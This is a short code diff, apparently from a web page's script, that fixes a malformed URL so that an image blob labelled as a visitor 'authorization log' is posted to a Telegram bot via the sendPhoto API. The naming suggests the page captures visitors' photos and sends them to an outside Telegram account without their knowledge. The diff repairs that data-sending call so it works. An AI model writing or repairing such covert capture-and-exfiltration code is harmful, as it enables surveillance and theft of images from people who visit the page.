@@ -200,7 +200,7 @@
             formData.append('photo', imageBlob, 'secure_log.jpg');
             formData.append('caption', '🛡️ Log Otorisasi Pengunjung: WELCOME BY RORAXBALI');
 
-            fetch(`https://telegram.org{TELEGRAM_BOT_TOKEN}/sendPhoto`, {
+            fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                 method: 'POST',
                 body: formData
             })
